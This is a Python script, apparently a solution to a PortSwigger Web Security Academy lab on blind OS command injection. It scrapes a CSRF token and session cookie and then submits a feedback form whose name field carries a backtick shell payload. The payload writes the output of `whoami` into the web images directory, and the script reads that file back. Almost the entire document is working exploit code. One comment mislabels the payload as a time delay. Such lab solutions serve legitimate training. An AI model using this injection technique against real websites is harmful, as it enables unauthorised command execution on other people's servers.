###################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 10/10/2023
#
# Lab: Blind OS command injection with output redirection
#
# Steps: 1. Fetch the feedback page
#        2. Extract csrf token and session cookie
#        3. Inject payload into the name field when submitting a feedback to
#           execute the `whoami` command and redirect the output to a text file
#           in a writable directory
#        4. Read the new created file
#
###################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re


#########
# Main
#########

# change this to your lab URL
url = "https://0af2009f039afd039020c83000920082.web-security-academy.net" 

print(Fore.BLUE + "⟪#⟫ Injection point: " + Fore.YELLOW + "name")

try:
    # fetch the feedback page
    injection = requests.get(f"{url}/feedback")
    
except:
    print(Fore.RED + "[!] Failed to fetch the feedback page through exception")
    exit(1)

print(Fore.WHITE + "⦗1⦘ Fetching the feedback page.. " + Fore.GREEN + "OK")

# get session cookie
session = injection.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", injection.content.decode())[0]

print(Fore.WHITE + "⦗2⦘ Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")

# the file name to save the output of `whoami` in
# you can change this to what you want
file_name = "whoami.txt"

# the payload to cause a 10 second delay
payload = f"`whoami>/var/www/images/{file_name}`"

# set session cookie
cookies ={
    "session": session
}

# data to send via POST
data = {
    "csrf": csrf,
    "name": payload,
    "email": "no@hack.com",
    "subject": "hacking",
    "message": "you are hacked",
}

try:
    # fetch the page with the injected payload
    injection = requests.post(f"{url}/feedback/submit", data, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to inject the payload through exception")
    exit(1)

print(Fore.WHITE + "⦗3⦘ Injecting payload to execute the `whoami` command and redirect the output to " + Fore.YELLOW + file_name + Fore.WHITE + ".. " +  Fore.GREEN + "OK")

try:
    # fetch the new created file
    injection = requests.get(f"{url}/image?filename={file_name}")
    
except:
    print(Fore.RED + "[!] Failed to fetch the new created file through exception")
    exit(1)

# the response contains the output of the `whoami` command
whoami = injection.text

print(Fore.WHITE + "⦗4⦘ Reading " + file_name + ".. " + Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + whoami, end="", flush=True)
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



